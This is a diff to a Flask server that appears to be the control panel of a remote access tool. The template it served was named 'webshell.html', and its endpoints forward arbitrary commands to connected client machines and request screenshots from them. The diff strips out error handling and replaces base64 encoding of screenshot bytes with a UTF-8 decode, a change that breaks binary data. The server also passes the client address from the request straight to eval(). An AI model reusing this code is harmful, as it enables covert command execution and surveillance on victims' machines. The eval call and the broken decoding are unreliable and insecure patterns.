@@ -36,16 +36,14 @@ def list_clients():
 
 @app.route('/')
 def index():
-    return render_template('webshell.html')  # 返回 HTML 页面
+    return render_template('index.html')  # 返回 HTML 页面
 
 @app.route('/execute', methods=['GET'])
 def execute_command():
     client_address = request.args.get("client")  # 获取客户端地址
     command = request.args.get("command")  # 获取命令
 
-    if command=='' or command==None:
-        return jsonify(''), 200
-    elif command and client_address:
+    if command and client_address:
         # 简单处理，将字符串地址分割并转换为元组形式 (IP, PORT)
         try:
             client_address_tuple = tuple(eval(client_address))
@@ -83,10 +81,7 @@ def screenshot():
             client_socket = clients.get(client_address_tuple)
         if client_socket:
             print(f"对 {client_address} 发送截图请求")
-            try:
-                client_socket.send(b'screenshot')  # 发送截图请求
-            except Exception as e:
-                return jsonify({'error': f'截图请求发送失败: {str(e)}'}), 500
+            client_socket.send(b'screenshot')  # 发送截图请求
 
             # 使用一个列表来收集所有接收到的数据片段
             image_data = b''  # 初始化数据接收变量
@@ -98,10 +93,9 @@ def screenshot():
                 if len(response) < 40960:  # 当接收到的数据小于40960字节时，说明接收完成
                     print(f"对 {client_address} 截图接收完成")
                     image_data += response  # 将接收到的数据片段合并
-                    # 将接收到的图像数据编码为 Base64
-                    image_base64 = base64.b64encode(image_data).decode('utf-8')
-                    print(image_base64)
-                    return jsonify({'message': '截图成功', 'image_data': image_base64}), 200
+                    # 解码为字符串
+                    image_data_decoded = image_data.decode('utf-8')
+                    return jsonify({'message': '截图成功', 'image_data': image_data_decoded}), 200
                 elif not response:  # 当返回空字节串时，说明没有数据接收 等待下一次接收
                     break
 
@@ -111,6 +105,21 @@ def screenshot():
             return jsonify({'error': '指定客户端未连接'}), 400
     else:
         return jsonify({'error': '客户端未提供'}), 400
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 if __name__ == "__main__":
     threading.Thread(target=accept_client, daemon=True).start()
